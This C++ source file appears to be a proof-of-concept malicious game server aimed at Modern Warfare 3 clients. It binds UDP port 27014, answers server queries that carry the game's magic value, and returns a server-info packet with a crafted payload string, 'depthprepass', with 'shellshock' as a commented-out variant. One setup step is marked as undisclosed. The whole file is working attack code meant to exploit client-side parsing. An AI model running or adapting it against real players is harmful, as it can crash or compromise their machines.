#include "stdinc.hpp"
#include "main.hpp"

#define MW3_SERVER_4CC 0x504F4F4C
#define BUF_SIZE 1024

SOCKET sock;

bool startUp()
{
    WSADATA wsa_data;
	auto wasResult = WSAStartup(MAKEWORD(2, 2), &wsa_data);
    if (wasResult != 0)
    {
        printf("WSAStartup error: %d\n", wasResult);
        return false;
    }

    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (INVALID_SOCKET == sock)
    {
        printf("Can't initialize socket\n");
        return false;
    }

    sockaddr_in service{};
	service.sin_family = AF_INET;
	service.sin_addr.s_addr = htonl(INADDR_ANY);

//  net_masterServerPort
    service.sin_port = htons(27014);
    auto result = bind(sock, (SOCKADDR*)&service, sizeof(service));
    if (SOCKET_ERROR == result)
    {
        printf("Can't bind socket\n");
        closesocket(sock);
        return false;
    }


    return true;
}

DWORD WINAPI recvTh(LPVOID)
{
    auto buf = std::make_unique<char[]>(BUF_SIZE);
    printf("Started thread\n");

    u_long iMode = 0;
    auto ioctlResult = ioctlsocket(sock, FIONBIO, &iMode);
    if (ioctlResult != 0)
    {
        printf("ioctlsocket error: %d\n", ioctlResult);
        return 1;
    }

    sockaddr_in sender{};
	int senderSize = sizeof(sender);
    serverInfo_t info{};

//  undisclosed step
    info.serverName_ptr = 0;
    info.rawDataSize = INFO_MAX_DATA;

    while (TRUE)
    {
        SecureZeroMemory(buf.get(), BUF_SIZE);
        auto len = recvfrom(sock, buf.get(), BUF_SIZE, 0, (SOCKADDR*)&sender, &senderSize);

        if (len == SOCKET_ERROR)
        {
            return 1;
        }

        if (len == sizeof(serverQuery_t))
        {
            auto* packet = (serverQuery_t*)buf.get();

            if (packet->magic4CC == MW3_SERVER_4CC)
            {
                printf("Server is sending info to a client\n");
                auto bad_string = "\x5e\x01\xCC\xCC\x0C" "depthprepass"s;
//              auto bad_string = "\x5e\x01\xCC\xCC\x0A" "shellshock"s;
                std::memcpy(&info.rawData[info.serverName_ptr], bad_string.data(), bad_string.length() + 1);
                sendto(sock, (char*)&info, sizeof(serverInfo_t), 0, (SOCKADDR*)&sender, senderSize);
            }
        }

        Sleep(1);
    }

    return 0;
}

int main(int, char**)
{
    if (!startUp())
    {
        return 1;
    }

    DWORD dwThreadId;
    auto thread = CreateThread(0, 0, recvTh, 0, 0, &dwThreadId);
    if (thread == NULL)
    {
        printf("Error in creating thread\n");
        return 1;
    }

    WaitForSingleObject(thread, INFINITE);
    WSACleanup();

    return 0;
}
